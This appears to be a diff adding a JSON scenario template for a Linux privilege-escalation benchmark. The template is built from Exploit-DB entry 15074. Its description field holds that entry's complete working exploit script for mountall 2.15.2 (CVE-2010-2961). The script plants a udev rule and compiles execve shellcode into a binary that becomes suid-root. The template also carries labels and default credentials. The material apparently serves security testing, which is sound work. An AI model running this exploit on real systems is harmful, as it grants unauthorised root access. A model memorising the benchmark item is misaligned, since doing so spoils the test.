@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_15074",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: mountall 2.15.2 (Ubuntu 10.04/10.10) - Local Privilege Escalation (CVE-2010-2961)\n\nExploit source code (15074.sh):\n```\n# source: https://www.securityfocus.com/bid/43084/info\n\n#!/bin/sh\n# by fuzz. For Anux inc. #\n# ubuntu 10.04 , 10.10\nif [ -z \"$1\" ]\nthen\n        echo \"usage: $0 <UDEV KERNEL EVENT>\"\n        echo \"see here http://www.reactivated.net/writing_udev_rules.html\"\n        exit\nfi\ncat > usn985-exploit.sh << EOF\n#!/bin/sh\nchown root:root $PWD/usn985-sc\nchmod +s $PWD/usn985-sc\nEOF\ncat > usn985-sc.c << EOF\nchar *s=\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\"\n\"\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";\nmain(){int *r;*((int *)&r+2)=(int)s;}\nEOF\ngcc usn985-sc.c -o usn985-sc\necho \"KERNEL==\\\"$1\\\", RUN+=\\\"$PWD/usn985-exploit.sh\\\"\" >> /dev/.udev/rules.d/root.rules\nchmod +x usn985-exploit.sh\necho \"All set, now wait for udev to restart (reinstall, udev upgrade, SE, raep, threat.)\"\necho \"Once the conf is reloaded, just make the udev event happen : usn985-sc file will get suid-root\"\n```",
+  "cve": "CVE-2010-2961",
+  "exploitdb_id": "15074",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_15074",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
